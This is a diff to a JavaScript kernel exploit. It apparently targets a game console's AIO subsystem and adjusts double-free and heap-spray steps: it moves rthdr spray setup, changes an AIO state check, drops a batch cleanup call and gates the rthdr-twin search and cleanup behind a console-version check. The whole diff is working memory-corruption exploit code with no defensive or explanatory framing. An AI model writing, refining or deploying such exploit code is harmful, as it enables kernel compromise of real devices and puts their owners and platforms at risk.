@@ -29,7 +29,6 @@ const pktopts_twins = new Array(2);
 const ipv6_socks = new Array(IPV6_SOCK_NUM);
 const spray_ids = new Uint32Array(SPRAY_NUM);
 const block_ids = new Uint32Array(WORKER_NUM);
-const batch_ids = new Uint32Array(HANDLES_NUM);
 const outs = new Uint32Array(AIO_MAX_NUM);
 
 let race_worker = undefined;
@@ -192,7 +191,7 @@ function verify_reqs2(aio_entry) {
     // check reqs2.ar2_result.state
     // state is actually a 32-bit value but the allocated memory was
     // initialized with zeros. all padding bytes must be 0 then
-    if (aio_entry.ar2_result.state <= 0 || aio_entry.ar2_result.state > AIO_STATE_COMPLETE) {
+    if (aio_entry.ar2_result.state <= 0 || aio_entry.ar2_result.state > AIO_STATE_ABORTED) {
       return false;
     }
 
@@ -342,6 +341,8 @@ function init() {
 
   // Prepare spray/leak rthdr0
   spray_rthdr0_addr = mem.alloc(0x100);
+  spray_rthdr0_len = build_rthdr(spray_rthdr0_addr, 0x80);
+
   leak_rthdr0_addr = mem.alloc(0x800);
 
   // Prepare reqs
@@ -450,8 +451,6 @@ function setup() {
 }
 
 async function double_free_reqs2() {
-  spray_rthdr0_len = build_rthdr(spray_rthdr0_addr, 0x80);
-
   const which_req = NUM_REQS - 1;
   const aio_ids = new Uint32Array(NUM_REQS);
 
@@ -850,7 +849,6 @@ function double_free_reqs1() {
   logger.info('Craft AIO queue entry started...');
 
   // overlap crafted reqs3 (aio_batch) with reqs2 (aio_entry)
-  spray_rthdr0_len = build_rthdr(spray_rthdr0_addr, 0x80);
   const spray_aio_entry = aio_entry.new(spray_rthdr0_addr);
 
   spray_aio_entry.ar2_ticket = 5;
@@ -916,10 +914,6 @@ function double_free_reqs1() {
   // enable deletion of target_ids
   process_aio(AIO_OP_POLL, target_ids);
 
-  // Free All aio requests that were used to spray the fake aio_batch
-  // Safe since aio_batch remains intact by the time aio_multi_delete() is called
-  process_aio(AIO_OP_CANCEL | AIO_OP_POLL | AIO_OP_DELETE, batch_ids);
-
   const status = outs.slice(0, 2);
   logger.debug(`target status: ${status.hex()}`);
 
@@ -934,12 +928,14 @@ function double_free_reqs1() {
   // we reclaim first since the sanity checking here is longer which makes it
   // more likely that we have another process claim the memory
   try {
-    logger.info('Looking for rthdr twins... !!');
+    if (version.console === 5) {
+      logger.info('Looking for rthdr twins... !!');
 
-    // RESTORE: double freed 0x80 block has been reclaimed with harmless data
-    find_rthdr_twins();
+      // RESTORE: double freed 0x80 block has been reclaimed with harmless data
+      find_rthdr_twins();
 
-    logger.info(`Found rthdr twins: ${rthdr_twins} !!`);
+      logger.info(`Found rthdr twins: ${rthdr_twins} !!`);
+    }
 
     logger.info('Make pktopts twins...');
 
@@ -1159,7 +1155,10 @@ async function exploit_main() {
 
     // Remove rthdr pointers
     remove_rthdr_from_so(pktopts_twins[1]);
-    remove_rthdr_from_so(rthdr_twins[0]);
+
+    if (version.console === 5) {
+      remove_rthdr_from_so(rthdr_twins[0]);
+    }
 
     logger.info('Corrupted context cleanup completed !!');
   } finally {
